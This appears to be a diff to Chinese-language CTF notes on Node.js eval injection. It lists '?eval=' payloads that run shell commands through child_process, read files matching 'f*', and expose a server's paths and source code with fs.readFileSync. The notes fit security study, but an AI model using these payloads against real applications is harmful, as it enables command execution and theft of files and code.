@@ -40,3 +40,10 @@ eval(require("child_process").execSync('ls'))
 ?eval=require( 'child_process' ).spawnSync( 'ls', [ '.' ] ).stdout.toString()
 ?eval=require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()
 ```
+
+查看目录和源码
+```
+?eval=__filename 可以看到路径为/app/routes/index.js 
+?eval=__dirname  看到/app/routes/
+?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')   查看源码
+```
